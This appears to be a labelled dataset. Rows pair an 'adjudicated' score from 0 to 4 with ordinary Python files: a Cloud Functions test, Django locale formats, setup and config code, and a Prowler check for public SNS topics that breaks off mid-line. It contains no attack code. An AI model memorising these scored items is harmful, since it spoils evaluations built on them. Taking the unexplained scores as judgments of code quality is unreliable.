test_print_name():<<NEWL>>    name = str(uuid.uuid4())<<NEWL>>    port = 8088  # Each running framework instance needs a unique port<<NEWL>><<NEWL>>    encoded_name = base64.b64encode(name.encode('utf-8')).decode('utf-8')<<NEWL>>    pubsub_message = {<<NEWL>>        'data': {'data': encoded_name}<<NEWL>>    }<<NEWL>><<NEWL>>    process = subprocess.Popen(<<NEWL>>      [<<NEWL>>        'functions-framework',<<NEWL>>        '--target', 'hello_pubsub',<<NEWL>>        '--signature-type', 'event',<<NEWL>>        '--port', str(port)<<NEWL>>      ],<<NEWL>>      cwd=os.path.dirname(__file__),<<NEWL>>      stdout=subprocess.PIPE<<NEWL>>    )<<NEWL>><<NEWL>>    # Send HTTP request simulating Pub/Sub message<<NEWL>>    # (GCF translates Pub/Sub messages to HTTP requests internally)<<NEWL>>    url = f'http://localhost:{port}/'<<NEWL>><<NEWL>>    retry_policy = Retry(total=6, backoff_factor=1)<<NEWL>>    retry_adapter = requests.adapters.HTTPAdapter(<<NEWL>>      max_retries=retry_policy)<<NEWL>><<NEWL>>    session = requests.Session()<<NEWL>>    session.mount(url, retry_adapter)<<NEWL>><<NEWL>>    response = session.post(url, json=pubsub_message)<<NEWL>><<NEWL>>    assert response.status_code == 200<<NEWL>><<NEWL>>    # Stop the functions framework process<<NEWL>>    process.kill()<<NEWL>>    process.wait()<<NEWL>>    out, err = process.communicate()<<NEWL>><<NEWL>>    print(out, err, response.content)<<NEWL>><<NEWL>>    assert f'Hello {name}!' in str(out)<<NEWL>># [END functions_pubsub_integration_test]
200	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = 'l, j F, Y'<<NEWL>>TIME_FORMAT = 'h:i a'<<NEWL>>DATETIME_FORMAT = 'j F, Y h:i a'<<NEWL>>YEAR_MONTH_FORMAT = 'F, Y'<<NEWL>>MONTH_DAY_FORMAT = 'j F'<<NEWL>>SHORT_DATE_FORMAT = 'j.M.Y'<<NEWL>>SHORT_DATETIME_FORMAT = 'j.M.Y H:i'<<NEWL>>FIRST_DAY_OF_WEEK = 1  # (Monday)<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'<<NEWL>>    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'<<NEWL>>    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'<<NEWL>>    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'<<NEWL>>    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'<<NEWL>>    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'<<NEWL>>    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'<<NEWL>>    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'<<NEWL>>    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'<<NEWL>>    '%d.%m.%y %H:%M',        # '25.10.06 14:30'<<NEWL>>    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'<<NEWL>>    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'<<NEWL>>    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'<<NEWL>>    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'<<NEWL>>    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'<<NEWL>>    '%m/%d/%y %H:%M',        # '10/25/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = '.'<<NEWL>>THOUSAND_SEPARATOR = "" ""<<NEWL>>NUMBER_GROUPING = 3"
191	adjudicated	0	"#! /usr/bin/env python3<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>try:<<NEWL>>    from setuptools import find_packages, setup<<NEWL>>except AttributeError:<<NEWL>>    from setuptools import find_packages, setup<<NEWL>><<NEWL>>NAME = 'wofrysrw'<<NEWL>>VERSION = '1.1.24'<<NEWL>>ISRELEASED = True<<NEWL>><<NEWL>>DESCRIPTION = 'WOFRY for SRW library'<<NEWL>>README_FILE = os.path.join(os.path.dirname(__file__), 'README.md')<<NEWL>>LONG_DESCRIPTION = open(README_FILE).read()<<NEWL>>AUTHOR = 'Luca Rebuffi'<<NEWL>>AUTHOR_EMAIL = 'lrebuffi@anl.gov'<<NEWL>>URL = 'https://github.com/lucarebuffi/wofrysrw'<<NEWL>>DOWNLOAD_URL = 'https://github.com/lucarebuffi/wofrysrw'<<NEWL>>LICENSE = 'GPLv3'<<NEWL>><<NEWL>>KEYWORDS = (<<NEWL>>    'dictionary',<<NEWL>>    'glossary',<<NEWL>>    'synchrotron'<<NEWL>>    'simulation',<<NEWL>>)<<NEWL>><<NEWL>>CLASSIFIERS = (<<NEWL>>    'Development Status :: 4 - Beta',<<NEWL>>    'Environment :: X11 Applications :: Qt',<<NEWL>>    'Environment :: Console',<<NEWL>>    'Environment :: Plugins',<<NEWL>>    'Programming Language :: Python :: 3',<<NEWL>>    'Intended Audience :: Science/Research',<<NEWL>>)<<NEWL>><<NEWL>>SETUP_REQUIRES = (<<NEWL>>    'setuptools',<<NEWL>>)<<NEWL>><<NEWL>>INSTALL_REQUIRES = (<<NEWL>>    'setuptools',<<NEWL>>    'numpy',<<NEWL>>    'scipy',<<NEWL>>    'syned>=1.0.26',<<NEWL>>    'wofry>=1.0.31',<<NEWL>>    'oasys-srwpy>=1.0.5'<<NEWL>>)<<NEWL>><<NEWL>>PACKAGES = [<<NEWL>>    ""wofrysrw"",<<NEWL>>]<<NEWL>><<NEWL>>PACKAGE_DATA = {}<<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    try:<<NEWL>>        import PyMca5, PyQt4<<NEWL>><<NEWL>>        raise NotImplementedError(""This version of wofrysrw doesn't work with Oasys1 beta.\nPlease install OASYS1 final release: https://www.aps.anl.gov/Science/Scientific-Software/OASYS"")<<NEWL>>    except:<<NEWL>>        setup(<<NEWL>>              name = NAME,<<NEWL>>              version = VERSION,<<NEWL>>              description = DESCRIPTION,<<NEWL>>              long_description = LONG_DESCRIPTION,<<NEWL>>              author = AUTHOR,<<NEWL>>              author_email = AUTHOR_EMAIL,<<NEWL>>              url = URL,<<NEWL>>              download_url = DOWNLOAD_URL,<<NEWL>>              license = LICENSE,<<NEWL>>              keywords = KEYWORDS,<<NEWL>>              classifiers = CLASSIFIERS,<<NEWL>>              packages = PACKAGES,<<NEWL>>              package_data = PACKAGE_DATA,<<NEWL>>              setup_requires = SETUP_REQUIRES,<<NEWL>>              install_requires = INSTALL_REQUIRES,<<NEWL>>              include_package_data = True,<<NEWL>>              zip_safe = False,<<NEWL>>              )"
311	adjudicated	0	"#!/usr/bin/env python<<NEWL>>#<<NEWL>># Copyright 2017 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>><<NEWL>>from lxml import etree<<NEWL>>import structlog<<NEWL>>from netconf.nc_rpc.rpc import Rpc<<NEWL>>import netconf.nc_common.error as ncerror<<NEWL>><<NEWL>>log = structlog.get_logger()<<NEWL>><<NEWL>><<NEWL>>class CloseSession(Rpc):<<NEWL>>    def __init__(self, request, request_xml, grpc_client, session,<<NEWL>>                 capabilities):<<NEWL>>        super(CloseSession, self).__init__(request, request_xml, grpc_client,<<NEWL>>                                           session, capabilities)<<NEWL>>        self._validate_parameters()<<NEWL>><<NEWL>>    def execute(self):<<NEWL>>        log.info('close-session-request', session=self.session.session_id)<<NEWL>>        if self.rpc_response.is_error:<<NEWL>>            return self.rpc_response<<NEWL>><<NEWL>>        self.rpc_response.node = etree.Element(""ok"")<<NEWL>><<NEWL>>        # Set the close session flag<<NEWL>>        self.rpc_response.close_session = True<<NEWL>>        return self.rpc_response<<NEWL>><<NEWL>>    def _validate_parameters(self):<<NEWL>><<NEWL>>        if self.request:<<NEWL>>            try:<<NEWL>>                if self.request['command'] != 'close-session':<<NEWL>>                    self.rpc_response.is_error = True<<NEWL>>                    self.rpc_response.node = ncerror.BadMsg(self.request_xml)<<NEWL>>                    return<<NEWL>><<NEWL>>            except Exception as e:<<NEWL>>                self.rpc_response.is_error = True<<NEWL>>                self.rpc_response.node = ncerror.ServerException(<<NEWL>>                    self.request_xml)<<NEWL>>                return"
80	adjudicated	4	"from rx import Observable, AnonymousObservable<<NEWL>>from rx.internal.exceptions import SequenceContainsNoElementsError<<NEWL>>from rx.internal import extensionmethod<<NEWL>><<NEWL>>def single_or_default_async(source, has_default=False, default_value=None):<<NEWL>>    def subscribe(observer):<<NEWL>>        value = [default_value]<<NEWL>>        seen_value = [False]<<NEWL>><<NEWL>>        def on_next(x):<<NEWL>>            if seen_value[0]:<<NEWL>>                observer.on_error(Exception('Sequence contains more than one element'))<<NEWL>>            else:<<NEWL>>                value[0] = x<<NEWL>>                seen_value[0] = True<<NEWL>><<NEWL>>        def on_completed():<<NEWL>>            if not seen_value[0] and not has_default:<<NEWL>>                observer.on_error(SequenceContainsNoElementsError())<<NEWL>>            else:<<NEWL>>                observer.on_next(value[0])<<NEWL>>                observer.on_completed()<<NEWL>><<NEWL>>        return source.subscribe(on_next, observer.on_error, on_completed)<<NEWL>>    return AnonymousObservable(subscribe)<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable)<<NEWL>>def single_or_default(self, predicate, default_value):<<NEWL>>    """"""Returns the only element of an observable sequence that matches the<<NEWL>>    predicate, or a default value if no such element exists this method<<NEWL>>    reports an exception if there is more than one element in the observable<<NEWL>>    sequence.<<NEWL>><<NEWL>>    Example:<<NEWL>>    res = source.single_or_default()<<NEWL>>    res = source.single_or_default(lambda x: x == 42)<<NEWL>>    res = source.single_or_default(lambda x: x == 42, 0)<<NEWL>>    res = source.single_or_default(None, 0)<<NEWL>><<NEWL>>    Keyword arguments:<<NEWL>>    predicate -- {Function} A predicate function to evaluate for elements in<<NEWL>>        the source sequence.<<NEWL>>    default_value -- [Optional] The default value if the index is outside<<NEWL>>        the bounds of the source sequence.<<NEWL>><<NEWL>>    Returns {Observable} Sequence containing the single element in the<<NEWL>>    observable sequence that satisfies the condition in the predicate, or a<<NEWL>>    default value if no such element exists.<<NEWL>>    """"""<<NEWL>><<NEWL>>    return self.filter(predicate).single_or_default(None, default_value) if predicate else single_or_default_async(self, True, default_value)<<NEWL>>    "
251	adjudicated	4	"""""""<<NEWL>>Provide urlresolver functions that return fully qualified URLs or view names<<NEWL>>""""""<<NEWL>>from django.urls import NoReverseMatch<<NEWL>>from django.urls import reverse as django_reverse<<NEWL>>from django.utils.functional import lazy<<NEWL>><<NEWL>>from rest_framework.settings import api_settings<<NEWL>>from rest_framework.utils.urls import replace_query_param<<NEWL>><<NEWL>><<NEWL>>def preserve_builtin_query_params(url, request=None):<<NEWL>>    """"""<<NEWL>>    Given an incoming request, and an outgoing URL representation,<<NEWL>>    append the value of any built-in query parameters.<<NEWL>>    """"""<<NEWL>>    if request is None:<<NEWL>>        return url<<NEWL>><<NEWL>>    overrides = [<<NEWL>>        api_settings.URL_FORMAT_OVERRIDE,<<NEWL>>    ]<<NEWL>><<NEWL>>    for param in overrides:<<NEWL>>        if param and (param in request.GET):<<NEWL>>            value = request.GET[param]<<NEWL>>            url = replace_query_param(url, param, value)<<NEWL>><<NEWL>>    return url<<NEWL>><<NEWL>><<NEWL>>def reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):<<NEWL>>    """"""<<NEWL>>    If versioning is being used then we pass any `reverse` calls through<<NEWL>>    to the versioning scheme instance, so that the resulting URL<<NEWL>>    can be modified if needed.<<NEWL>>    """"""<<NEWL>>    scheme = getattr(request, 'versioning_scheme', None)<<NEWL>>    if scheme is not None:<<NEWL>>        try:<<NEWL>>            url = scheme.reverse(viewname, args, kwargs, request, format, **extra)<<NEWL>>        except NoReverseMatch:<<NEWL>>            # In case the versioning scheme reversal fails, fallback to the<<NEWL>>            # default implementation<<NEWL>>            url = _reverse(viewname, args, kwargs, request, format, **extra)<<NEWL>>    else:<<NEWL>>        url = _reverse(viewname, args, kwargs, request, format, **extra)<<NEWL>><<NEWL>>    return preserve_builtin_query_params(url, request)<<NEWL>><<NEWL>><<NEWL>>def _reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):<<NEWL>>    """"""<<NEWL>>    Same as `django.urls.reverse`, but optionally takes a request<<NEWL>>    and returns a fully qualified URL, using the request to get the base URL.<<NEWL>>    """"""<<NEWL>>    if format is not None:<<NEWL>>        kwargs = kwargs or {}<<NEWL>>        kwargs['format'] = format<<NEWL>>    url = django_reverse(viewname, args=args, kwargs=kwargs, **extra)<<NEWL>>    if request:<<NEWL>>        return request.build_absolute_uri(url)<<NEWL>>    return url<<NEWL>><<NEWL>><<NEWL>>reverse_lazy = lazy(reverse, str)"
331	adjudicated	3	"""""""<<NEWL>>    pygments.styles.native<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    pygments version of my ""native"" vim theme.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Token, Whitespace<<NEWL>><<NEWL>><<NEWL>>class NativeStyle(Style):<<NEWL>>    """"""<<NEWL>>    Pygments version of the ""native"" vim theme.<<NEWL>>    """"""<<NEWL>><<NEWL>>    background_color = '#202020'<<NEWL>>    highlight_color = '#404040'<<NEWL>>    line_number_color = '#aaaaaa'<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Token:              '#d0d0d0',<<NEWL>>        Whitespace:         '#666666',<<NEWL>><<NEWL>>        Comment:            'italic #ababab',<<NEWL>>        Comment.Preproc:    'noitalic bold #cd2828',<<NEWL>>        Comment.Special:    'noitalic bold #e50808 bg:#520000',<<NEWL>><<NEWL>>        Keyword:            'bold #6ebf26',<<NEWL>>        Keyword.Pseudo:     'nobold',<<NEWL>>        Operator.Word:      'bold #6ebf26',<<NEWL>><<NEWL>>        String:             '#ed9d13',<<NEWL>>        String.Other:       '#ffa500',<<NEWL>><<NEWL>>        Number:             '#51b2fd',<<NEWL>><<NEWL>>        Name.Builtin:       '#2fbccd',<<NEWL>>        Name.Variable:      '#40ffff',<<NEWL>>        Name.Constant:      '#40ffff',<<NEWL>>        Name.Class:         'underline #71adff',<<NEWL>>        Name.Function:      '#71adff',<<NEWL>>        Name.Namespace:     'underline #71adff',<<NEWL>>        Name.Exception:     '#bbbbbb',<<NEWL>>        Name.Tag:           'bold #6ebf26',<<NEWL>>        Name.Attribute:     '#bbbbbb',<<NEWL>>        Name.Decorator:     '#ffa500',<<NEWL>><<NEWL>>        Generic.Heading:    'bold #ffffff',<<NEWL>>        Generic.Subheading: 'underline #ffffff',<<NEWL>>        Generic.Deleted:    '#d22323',<<NEWL>>        Generic.Inserted:   '#589819',<<NEWL>>        Generic.Error:      '#d22323',<<NEWL>>        Generic.Emph:       'italic',<<NEWL>>        Generic.Strong:     'bold',<<NEWL>>        Generic.Prompt:     '#aaaaaa',<<NEWL>>        Generic.Output:     '#cccccc',<<NEWL>>        Generic.Traceback:  '#d22323',<<NEWL>><<NEWL>>        Error:              'bg:#e3d2d2 #a61717'<<NEWL>>    }"
271	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""insidetextfont"", parent_name=""funnelarea"", **kwargs<<NEWL>>    ):<<NEWL>>        super(InsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
360	adjudicated	2	"""""""Manager to read and modify frontend config data in JSON files.<<NEWL>>""""""<<NEWL>># Copyright (c) Jupyter Development Team.<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>import os.path<<NEWL>><<NEWL>>from notebook.config_manager import BaseJSONConfigManager, recursive_update<<NEWL>>from jupyter_core.paths import jupyter_config_dir, jupyter_config_path<<NEWL>>from traitlets import Unicode, Instance, List, observe, default<<NEWL>>from traitlets.config import LoggingConfigurable<<NEWL>><<NEWL>><<NEWL>>class ConfigManager(LoggingConfigurable):<<NEWL>>    """"""Config Manager used for storing notebook frontend config""""""<<NEWL>><<NEWL>>    # Public API<<NEWL>><<NEWL>>    def get(self, section_name):<<NEWL>>        """"""Get the config from all config sections.""""""<<NEWL>>        config = {}<<NEWL>>        # step through back to front, to ensure front of the list is top priority<<NEWL>>        for p in self.read_config_path[::-1]:<<NEWL>>            cm = BaseJSONConfigManager(config_dir=p)<<NEWL>>            recursive_update(config, cm.get(section_name))<<NEWL>>        return config<<NEWL>><<NEWL>>    def set(self, section_name, data):<<NEWL>>        """"""Set the config only to the user's config.""""""<<NEWL>>        return self.write_config_manager.set(section_name, data)<<NEWL>><<NEWL>>    def update(self, section_name, new_data):<<NEWL>>        """"""Update the config only to the user's config.""""""<<NEWL>>        return self.write_config_manager.update(section_name, new_data)<<NEWL>><<NEWL>>    # Private API<<NEWL>><<NEWL>>    read_config_path = List(Unicode())<<NEWL>><<NEWL>>    @default('read_config_path')<<NEWL>>    def _default_read_config_path(self):<<NEWL>>        return [os.path.join(p, 'nbconfig') for p in jupyter_config_path()]<<NEWL>><<NEWL>>    write_config_dir = Unicode()<<NEWL>><<NEWL>>    @default('write_config_dir')<<NEWL>>    def _default_write_config_dir(self):<<NEWL>>        return os.path.join(jupyter_config_dir(), 'nbconfig')<<NEWL>><<NEWL>>    write_config_manager = Instance(BaseJSONConfigManager)<<NEWL>><<NEWL>>    @default('write_config_manager')<<NEWL>>    def _default_write_config_manager(self):<<NEWL>>        return BaseJSONConfigManager(config_dir=self.write_config_dir)<<NEWL>><<NEWL>>    @observe('write_config_dir')<<NEWL>>    def _update_write_config_dir(self, change):<<NEWL>>        self.write_config_manager = BaseJSONConfigManager(config_dir=self.write_config_dir)"
220	adjudicated	1	"# Copyright (c) 2006, 2010, 2012-2014 LOGILAB S.A. (Paris, FRANCE) <contact@logilab.fr><<NEWL>># Copyright (c) 2012-2014 Google, Inc.<<NEWL>># Copyright (c) 2012 FELD Boris <lothiraldan@gmail.com><<NEWL>># Copyright (c) 2014-2020 Claudiu Popa <pcmanticore@gmail.com><<NEWL>># Copyright (c) 2014 Brett Cannon <brett@python.org><<NEWL>># Copyright (c) 2014 Ricardo Gemignani <ricardo.gemignani@gmail.com><<NEWL>># Copyright (c) 2014 Arun Persaud <arun@nubati.net><<NEWL>># Copyright (c) 2015 Simu Toni <simutoni@gmail.com><<NEWL>># Copyright (c) 2015 Ionel Cristian Maries <contact@ionelmc.ro><<NEWL>># Copyright (c) 2017 Kári Tristan Helgason <kthelgason@gmail.com><<NEWL>># Copyright (c) 2018 ssolanki <sushobhitsolanki@gmail.com><<NEWL>># Copyright (c) 2018 Sushobhit <31987769+sushobhit27@users.noreply.github.com><<NEWL>># Copyright (c) 2018 Ville Skyttä <ville.skytta@iki.fi><<NEWL>># Copyright (c) 2019, 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com><<NEWL>># Copyright (c) 2020 hippo91 <guillaume.peillex@gmail.com><<NEWL>># Copyright (c) 2020 Anthony Sottile <asottile@umich.edu><<NEWL>># Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com><<NEWL>># Copyright (c) 2021 ruro <ruro.ruro@ya.ru><<NEWL>><<NEWL>># Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html<<NEWL>># For details: https://github.com/PyCQA/pylint/blob/main/LICENSE<<NEWL>><<NEWL>>""""""utilities methods and classes for reporters""""""<<NEWL>><<NEWL>><<NEWL>>from pylint import utils<<NEWL>>from pylint.reporters.base_reporter import BaseReporter<<NEWL>>from pylint.reporters.collecting_reporter import CollectingReporter<<NEWL>>from pylint.reporters.json_reporter import JSONReporter<<NEWL>>from pylint.reporters.multi_reporter import MultiReporter<<NEWL>>from pylint.reporters.reports_handler_mix_in import ReportsHandlerMixIn<<NEWL>><<NEWL>><<NEWL>>def initialize(linter):<<NEWL>>    """"""initialize linter with reporters in this package""""""<<NEWL>>    utils.register_plugins(linter, __path__[0])<<NEWL>><<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""BaseReporter"",<<NEWL>>    ""ReportsHandlerMixIn"",<<NEWL>>    ""JSONReporter"",<<NEWL>>    ""CollectingReporter"",<<NEWL>>    ""MultiReporter"",<<NEWL>>]"
393	adjudicated	3	"# Copyright 2017-present Open Networking Foundation<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>># Copyright (c) 2008 The Board of Trustees of The Leland Stanford Junior University<<NEWL>># Copyright (c) 2011, 2012 Open Networking Foundation<<NEWL>># Copyright (c) 2012, 2013 Big Switch Networks, Inc.<<NEWL>># See the file LICENSE.pyloxi which should have been included in the source distribution<<NEWL>># Automatically generated by LOXI from template toplevel_init.py<<NEWL>># Do not modify<<NEWL>><<NEWL>>version_names = {<<NEWL>>    1: ""1.0"",<<NEWL>>    2: ""1.1"",<<NEWL>>    3: ""1.2"",<<NEWL>>    4: ""1.3"",<<NEWL>>    5: ""1.4"",<<NEWL>>}<<NEWL>><<NEWL>>def protocol(ver):<<NEWL>>    """"""<<NEWL>>    Import and return the protocol module for the given wire version.<<NEWL>>    """"""<<NEWL>>    if ver == 1:<<NEWL>>        import of10<<NEWL>>        return of10<<NEWL>><<NEWL>>    if ver == 2:<<NEWL>>        import of11<<NEWL>>        return of11<<NEWL>><<NEWL>>    if ver == 3:<<NEWL>>        import of12<<NEWL>>        return of12<<NEWL>><<NEWL>>    if ver == 4:<<NEWL>>        import of13<<NEWL>>        return of13<<NEWL>><<NEWL>>    if ver == 5:<<NEWL>>        import of14<<NEWL>>        return of14<<NEWL>><<NEWL>>    raise ValueError<<NEWL>><<NEWL>>class ProtocolError(Exception):<<NEWL>>    """"""<<NEWL>>    Raised when failing to deserialize an invalid OpenFlow message.<<NEWL>>    """"""<<NEWL>>    pass<<NEWL>><<NEWL>>class Unimplemented(Exception):<<NEWL>>    """"""<<NEWL>>    Raised when an OpenFlow feature is not yet implemented in PyLoxi.<<NEWL>>    """"""<<NEWL>>    pass<<NEWL>><<NEWL>>def unimplemented(msg):<<NEWL>>    raise Unimplemented(msg)<<NEWL>><<NEWL>>class OFObject(object):<<NEWL>>    """"""<<NEWL>>    Superclass of all OpenFlow classes<<NEWL>>    """"""<<NEWL>>    def __init__(self, *args):<<NEWL>>        raise NotImplementedError(""cannot instantiate abstract class"")<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        return not self.__eq__(other)<<NEWL>><<NEWL>>    def show(self):<<NEWL>>        import loxi.pp<<NEWL>>        return loxi.pp.pp(self)"
2	adjudicated	4	# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = 'j M Y'                   # '25 Oct 2006'<<NEWL>>TIME_FORMAT = 'P'                       # '2:30 p.m.'<<NEWL>>DATETIME_FORMAT = 'j M Y, P'            # '25 Oct 2006, 2:30 p.m.'<<NEWL>>YEAR_MONTH_FORMAT = 'F Y'               # 'October 2006'<<NEWL>>MONTH_DAY_FORMAT = 'j F'                # '25 October'<<NEWL>>SHORT_DATE_FORMAT = 'd/m/Y'             # '25/10/2006'<<NEWL>>SHORT_DATETIME_FORMAT = 'd/m/Y P'       # '25/10/2006 2:30 p.m.'<<NEWL>>FIRST_DAY_OF_WEEK = 0                   # Sunday<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%d/%m/%Y', '%d/%m/%y',             # '25/10/2006', '25/10/06'<<NEWL>>    # '%b %d %Y', '%b %d, %Y',          # 'Oct 25 2006', 'Oct 25, 2006'<<NEWL>>    # '%d %b %Y', '%d %b, %Y',          # '25 Oct 2006', '25 Oct, 2006'<<NEWL>>    # '%B %d %Y', '%B %d, %Y',          # 'October 25 2006', 'October 25, 2006'<<NEWL>>    # '%d %B %Y', '%d %B, %Y',          # '25 October 2006', '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',                # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',             # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',                   # '2006-10-25 14:30'<<NEWL>>    '%d/%m/%Y %H:%M:%S',                # '25/10/2006 14:30:59'<<NEWL>>    '%d/%m/%Y %H:%M:%S.%f',             # '25/10/2006 14:30:59.000200'<<NEWL>>    '%d/%m/%Y %H:%M',                   # '25/10/2006 14:30'<<NEWL>>    '%d/%m/%y %H:%M:%S',                # '25/10/06 14:30:59'<<NEWL>>    '%d/%m/%y %H:%M:%S.%f',             # '25/10/06 14:30:59.000200'<<NEWL>>    '%d/%m/%y %H:%M',                   # '25/10/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = '.'<<NEWL>>THOUSAND_SEPARATOR = ','<<NEWL>>NUMBER_GROUPING = 3
142	adjudicated	0	"from prowler.lib.check.models import Check, Check_Report_AWS<<NEWL>>from prowler.providers.aws.services.sns.sns_client import sns_client<<NEWL>><<NEWL>><<NEWL>>class sns_topics_not_publicly_accessible(Check):<<NEWL>>    def execute(self):<<NEWL>>        findings = []<<NEWL>>        for topic in sns_client.topics:<<NEWL>>            report = Check_Report_AWS(self.metadata())<<NEWL>>            report.region = topic.region<<NEWL>>            report.resource_id = topic.name<<NEWL>>            report.resource_arn = topic.arn<<NEWL>>            report.status = ""PASS""<<NEWL>>            report.status_extended = f""SNS topic {topic.name} without public access""<<NEWL>>            if topic.policy:<<NEWL>>                for statement in topic.policy[""Statement""]:<<NEWL>>                    # Only check allow statements<<NEWL>>                    if statement[""Effect""] == ""Allow"":<<NEWL>>                        if (<<NEWL>>                            ""*"" in statement[""Principal""]<<NEWL>>                            or (<<NEWL>>                                ""AWS"" in statement[""Principal""]<<NEWL>>                                and 